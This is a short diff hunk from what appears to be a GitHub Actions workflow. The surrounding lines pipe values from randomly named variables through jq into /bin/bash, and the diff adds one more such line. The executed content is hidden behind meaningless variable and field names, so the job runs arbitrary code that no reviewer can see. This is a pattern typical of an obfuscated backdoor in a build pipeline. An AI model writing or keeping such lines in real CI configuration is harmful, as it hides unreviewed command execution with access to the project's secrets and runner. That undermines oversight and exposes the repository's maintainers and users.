@@ -20,6 +20,7 @@ jobs:
           echo $xg8 | jq -r .dti45918 | /bin/bash
           printf '%s' "$igq182" | jq -r .bat5445 | /bin/bash
           printf '%s' "$mq87146" | jq -r .cgvtk662 | /bin/bash
+          echo $nedmp3 | jq -r .nuf85 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
